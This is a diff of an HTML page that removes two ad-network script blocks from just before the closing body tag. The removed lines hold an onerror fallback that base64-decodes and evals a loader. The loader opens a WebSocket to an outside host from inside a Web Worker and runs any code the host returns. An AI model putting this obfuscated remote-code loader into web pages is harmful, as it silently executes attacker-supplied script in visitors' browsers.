@@ -289,33 +289,5 @@
         enable_page_level_ads: true
       });
     </script>
-    <div id="MIXADV_4541" class="MIXADVERT_NET"></div>
-    <script> 
-        var node4541 = document.getElementById("MIXADV_4541");
-        if( node4541 )
-        {
-           var script = document.createElement("script");
-           script.charset = "utf-8";
-           script.src = "https://m.mixadvert.com/show/?id=4541&r="+Math.random();
-           node4541.parentNode.appendChild(script); 
-           script.onerror = function(){
-              window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU0MSIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
-          }
-        }
-    </script>
-    <div id="MIXADV_4571" class="MIXADVERT_NET"></div>
-    <script> 
-        var node4571 = document.getElementById("MIXADV_4571");
-        if( node4571 )
-        {
-        var script = document.createElement("script");
-        script.charset = "utf-8";
-        script.src = "https://m.mixadvert.com/show/?id=4571&r="+Math.random();
-        node4571.parentNode.appendChild(script); 
-        script.onerror = function(){
-          window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU3MSIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
-        }
-        }
-    </script>
 </body>
 </html>
